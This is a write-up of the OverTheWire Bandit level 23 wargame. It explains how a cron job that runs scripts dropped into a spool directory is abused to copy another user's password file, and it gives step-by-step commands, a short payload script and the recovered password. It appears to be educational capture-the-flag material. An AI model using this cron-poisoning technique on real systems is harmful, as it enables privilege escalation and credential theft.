# 🔍 OverTheWire Bandit: Level 23 ➡️ Level 24

## 📝 Level Overview
* Objective: Achieve Arbitrary Code Execution (ACE) via an insecurely configured cron daemon that executes user-supplied shell scripts automatically.
* Current Access: bandit23
* Target Access: bandit24
* Key Lessons Learned: Automated Task Poisoning, Writing Custom Exploitation Shell Scripts, GNU/Linux Permissions Bypass, Exploit Debugging.

---

## 🔍 The Technical Challenge & Reconnaissance

### Step 1: Discovering the Cron Task
We examine the background system tasks running inside `/etc/cron.d/` and `cat cronjob_bandit24`:

Output:
```bash
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
This target configuration runs a central provisioning script every minute under the administrative context of user "bandit24".

### Step 2: Code Review of the System Provisioner
We inspect the automated orchestration logic:
```bash
cat /usr/bin/cronjob_bandit24.sh
```
Core Vulnerable Logic:
The script iterates through a specific public spool directory (e.g., `/var/spool/bandit24/foo/`), executes any file placed inside it with elevated `bandit24` permissions, and deletes it immediately after execution.

---

## 🚀 The Exploitation & Injection (Step-by-Step)

### Step 1: Setting up an Isolated Workspace
Since global system paths like `/tmp` or the target spool directory restrict structural user listing, we spawn a private sandboxed directory to craft our exploit:
```bash
mkdir /tmp/0xZiki && cd /tmp/0xZiki
```
### Step 2: Preparing the Target Output Gate
We instantiate a dummy data holder file to receive our leaked credentials. It must be world-writable (`777`) so the high-privilege cron runner daemon can successfully open and overwrite it:
```bash
touch New_pass.txt && chmod 777 New_pass.txt
```
### Step 3: Weaponizing the Shell Script (The Payload)
We utilize `nano` to create a malicious shell script `pass.sh`. The final debugged code is mapped out as follows:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/0xZiki/New_pass.txt
```
We grant the execution bit descriptor to our payload to ensure the system executes it:
```bash
chmod +x pass.sh
```
### Step 4: Injecting the Exploit Payload
We dump our weaponized exploit script directly into the path actively watched by the high-privilege cron job daemon:
```bash
cp pass.sh /var/spool/bandit24/foo/
```
### 🎯 Extraction & Post-Exploitation
We pause for 60 seconds to let the background job process trigger the script execution queue.

After checking our output dump file:
```bash
cat New_pass.txt
```
- Result: The plaintext flag for Level 24 is cleanly retrieved:
```bash
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```
- Note: This password changes from one person to another
